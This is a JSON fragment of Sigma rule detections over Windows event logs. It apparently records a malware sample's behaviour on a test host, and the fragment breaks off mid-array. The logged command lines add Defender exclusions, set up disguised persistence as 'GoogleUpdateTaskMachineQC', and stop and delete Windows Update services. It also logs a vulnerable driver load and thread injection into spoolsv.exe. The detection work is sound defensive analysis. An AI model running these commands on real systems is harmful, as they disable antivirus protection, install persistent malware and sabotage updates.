                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "Hashes":  "MD5=0C0195C48B6B8582FA6F6373032118DA,SHA256=11BD2C9F9E2397C9A16E0990E4ED2CF0679498FE0FD418A3DFDAC60B5C160EE5,IMPHASH=D41FA95D4642DC981F10DE36F4DC8CD7",
                                                                                             "RuleName":  "-",
                                                                                             "SignatureStatus":  "Valid",
                                                                                             "ImageLoaded":  "C:\\Program Files\\Google\\Libs\\WR64.sys",
                                                                                             "UtcTime":  "1666360224",
                                                                                             "EventID":  "6",
                                                                                             "Signature":  "Noriyuki MIYAZAKI",
                                                                                             "Signed":  "true"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "high",
                                                    "rule_id":  "efe6f377eb5896688f0baa7d44db4fc8d0639fa43f0d3dbb262bde8a7eb7b453",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Vulnerable Driver Load",
                                                    "rule_description":  "Detects the load of known vulnerable drivers by hash value",
                                                    "rule_author":  "Nasreddine Bencherchali"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "SourceProcessId":  "3556",
                                                                                             "SourceProcessGuid":  "{C784477D-A379-6352-8906-000000004100}",
                                                                                             "TargetProcessId":  "1232",
                                                                                             "EventID":  "8",
                                                                                             "SourceImage":  "C:\\Windows\\System32\\dllhost.exe",
                                                                                             "StartFunction":  "-",
                                                                                             "TargetProcessGuid":  "{C784477D-D9A4-62FC-2F00-000000004100}",
                                                                                             "UtcTime":  "1666360207",
                                                                                             "StartModule":  "-",
                                                                                             "TargetImage":  "C:\\Windows\\System32\\spoolsv.exe",
                                                                                             "StartAddress":  "5715504",
                                                                                             "NewThreadId":  "6884"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "medium",
                                                    "rule_id":  "35516fc873ed87d5b0b7a43b8533ffc2f5caa47a50e9166c663b25628f65fed4",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Suspicious Remote Thread Target",
                                                    "rule_description":  "Offensive tradecraft is switching away from using APIs like \"CreateRemoteThread\", however, this is still largely observed in the wild. This rule aims to detect suspicious processes (those we would not expect to behave in this way like word.exe or outlook.exe) creating remote threads on other processes. It is a generalistic rule, but it should have a low FP ratio due to the selected range of processes.",
                                                    "rule_author":  "Florian Roth"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\george\\Desktop\\",
                                                                                             "LogonId":  "251750",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "1666360160",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
                                                                                             "ParentImage":  "C:\\Users\\george\\Desktop\\program.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "7040",
                                                                                             "ParentProcessGuid":  "{C784477D-A35F-6352-6106-000000004100}",
                                                                                             "Product":  "Microsoft\\xae Windows\\xae Operating System",
                                                                                             "LogonGuid":  "C784477D-D9A8-62FC-66D7-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A360-6352-6306-000000004100}",
                                                                                             "CommandLine":  "powershell Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramFiles) -Force",
                                                                                             "ParentCommandLine":  "\"C:\\Users\\george\\Desktop\\program.exe\" ",
                                                                                             "ProcessId":  "4476",
                                                                                             "FileVersion":  "10.0.17134.1 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "medium",
                                                    "rule_id":  "7e416af5a1bb67fdbd2f30ae3f5da7f74583460b36546527c909c354fb5dcd00",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Powershell Defender Exclusion",
                                                    "rule_description":  "Detects requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets",
                                                    "rule_author":  "Florian Roth"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\george\\Desktop\\",
                                                                                             "LogonId":  "251750",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "1666360166",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
                                                                                             "ParentImage":  "C:\\Users\\george\\Desktop\\program.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "7040",
                                                                                             "ParentProcessGuid":  "{C784477D-A35F-6352-6106-000000004100}",
                                                                                             "Product":  "Microsoft\\xae Windows\\xae Operating System",
                                                                                             "LogonGuid":  "C784477D-D9A8-62FC-66D7-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A366-6352-6A06-000000004100}",
                                                                                             "CommandLine":  "powershell \u003c#ecgxrz#\u003e IF((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { IF([System.Environment]::OSVersion.Version -lt [System.Version]\"6.2\") { \"schtasks /create /f /sc onlogon /rl highest /ru \u0027System\u0027 /tn \u0027GoogleUpdateTaskMachineQC\u0027 /tr \u0027\u0027\u0027C:\\Program Files\\Google\\Chrome\\updater.exe\u0027\u0027\u0027\" } Else { Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute \u0027C:\\Program Files\\Google\\Chrome\\updater.exe\u0027)  -Trigger (New-ScheduledTaskTrigger -AtStartup)  -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000))  -TaskName \u0027GoogleUpdateTaskMachineQC\u0027 -User \u0027System\u0027 -RunLevel \u0027Highest\u0027 -Force; } } Else { reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"GoogleUpdateTaskMachineQC\" /t REG_SZ /f /d \u0027C:\\Program Files\\Google\\Chrome\\updater.exe\u0027 }",
                                                                                             "ParentCommandLine":  "\"C:\\Users\\george\\Desktop\\program.exe\" ",
                                                                                             "ProcessId":  "5956",
                                                                                             "FileVersion":  "10.0.17134.1 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "low",
                                                    "rule_id":  "4b2c1a09ad8532fd7bf380feea00e848eb5daf3d246d1f4dac0ef853f29bc01c",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Too Long PowerShell Commandlines",
                                                    "rule_description":  "Detects Too long PowerShell command lines",
                                                    "rule_author":  "oscd.community, Natalia Shornikova"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "SubjectDomainName":  "NT AUTHORITY",
                                                                                             "PrivilegeList":  "SeAssignPrimaryTokenPrivilege\r\n\t\t\tSeTcbPrivilege\r\n\t\t\tSeSecurityPrivilege\r\n\t\t\tSeTakeOwnershipPrivilege\r\n\t\t\tSeLoadDriverPrivilege\r\n\t\t\tSeBackupPrivilege\r\n\t\t\tSeRestorePrivilege\r\n\t\t\tSeDebugPrivilege\r\n\t\t\tSeAuditPrivilege\r\n\t\t\tSeSystemEnvironmentPrivilege\r\n\t\t\tSeImpersonatePrivilege\r\n\t\t\tSeDelegateSessionUserImpersonatePrivilege",
                                                                                             "SubjectUserName":  "SYSTEM",
                                                                                             "SubjectLogonId":  "999",
                                                                                             "EventID":  "4672",
                                                                                             "SubjectUserSid":  "S-1-5-18"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "low",
                                                    "rule_id":  "8919a871f4a52b7af785fab44b4665ab6a3637e6ebeeac0288df8a5012a48be2",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "User with Privileges Logon",
                                                    "rule_description":  "Detects logon with \"Special groups\" and \"Special Privileges\" can be thought of as Administrator groups or privileges.",
                                                    "rule_author":  "frack113"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\george\\Desktop\\",
                                                                                             "LogonId":  "251750",
                                                                                             "OriginalFileName":  "sc.exe",
                                                                                             "UtcTime":  "1666360166",
                                                                                             "Description":  "Service Control Manager Configuration Tool",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\cmd.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\sc.exe",
                                                                                             "ParentProcessId":  "2464",
                                                                                             "ParentProcessGuid":  "{C784477D-A365-6352-6706-000000004100}",
                                                                                             "Product":  "Microsoft\\xae Windows\\xae Operating System",
                                                                                             "LogonGuid":  "C784477D-D9A8-62FC-66D7-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A366-6352-6C06-000000004100}",
                                                                                             "CommandLine":  "sc  stop UsoSvc ",
                                                                                             "ParentCommandLine":  "cmd /c sc stop UsoSvc \u0026 sc stop WaaSMedicSvc \u0026 sc stop wuauserv \u0026 sc stop bits \u0026 sc stop dosvc \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\bits\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc\" /f",
                                                                                             "ProcessId":  "4224",
                                                                                             "FileVersion":  "10.0.17134.1 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\george\\Desktop\\",
                                                                                             "LogonId":  "251750",
                                                                                             "OriginalFileName":  "sc.exe",
                                                                                             "UtcTime":  "1666360167",
                                                                                             "Description":  "Service Control Manager Configuration Tool",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\cmd.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\sc.exe",
                                                                                             "ParentProcessId":  "2464",
                                                                                             "ParentProcessGuid":  "{C784477D-A365-6352-6706-000000004100}",
                                                                                             "Product":  "Microsoft\\xae Windows\\xae Operating System",
                                                                                             "LogonGuid":  "C784477D-D9A8-62FC-66D7-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A367-6352-6F06-000000004100}",
                                                                                             "CommandLine":  "sc  stop WaaSMedicSvc ",
                                                                                             "ParentCommandLine":  "cmd /c sc stop UsoSvc \u0026 sc stop WaaSMedicSvc \u0026 sc stop wuauserv \u0026 sc stop bits \u0026 sc stop dosvc \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\bits\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc\" /f",
                                                                                             "ProcessId":  "4016",
                                                                                             "FileVersion":  "10.0.17134.1 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\george\\Desktop\\",
                                                                                             "LogonId":  "251750",
                                                                                             "OriginalFileName":  "sc.exe",
                                                                                             "UtcTime":  "1666360168",
                                                                                             "Description":  "Service Control Manager Configuration Tool",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\cmd.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\sc.exe",
                                                                                             "ParentProcessId":  "2464",
                                                                                             "ParentProcessGuid":  "{C784477D-A365-6352-6706-000000004100}",
                                                                                             "Product":  "Microsoft\\xae Windows\\xae Operating System",
                                                                                             "LogonGuid":  "C784477D-D9A8-62FC-66D7-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A368-6352-7106-000000004100}",
                                                                                             "CommandLine":  "sc  stop wuauserv ",
                                                                                             "ParentCommandLine":  "cmd /c sc stop UsoSvc \u0026 sc stop WaaSMedicSvc \u0026 sc stop wuauserv \u0026 sc stop bits \u0026 sc stop dosvc \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\bits\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc\" /f",
                                                                                             "ProcessId":  "3416",
                                                                                             "FileVersion":  "10.0.17134.1 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\george\\Desktop\\",
                                                                                             "LogonId":  "251750",
                                                                                             "OriginalFileName":  "sc.exe",
                                                                                             "UtcTime":  "1666360168",
                                                                                             "Description":  "Service Control Manager Configuration Tool",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\cmd.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\sc.exe",
                                                                                             "ParentProcessId":  "2464",
                                                                                             "ParentProcessGuid":  "{C784477D-A365-6352-6706-000000004100}",
                                                                                             "Product":  "Microsoft\\xae Windows\\xae Operating System",
                                                                                             "LogonGuid":  "C784477D-D9A8-62FC-66D7-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A368-6352-7306-000000004100}",
                                                                                             "CommandLine":  "sc  stop bits ",
                                                                                             "ParentCommandLine":  "cmd /c sc stop UsoSvc \u0026 sc stop WaaSMedicSvc \u0026 sc stop wuauserv \u0026 sc stop bits \u0026 sc stop dosvc \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\bits\" /f \u0026 reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc\" /f",
                                                                                             "ProcessId":  "1948",
                                                                                             "FileVersion":  "10.0.17134.1 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
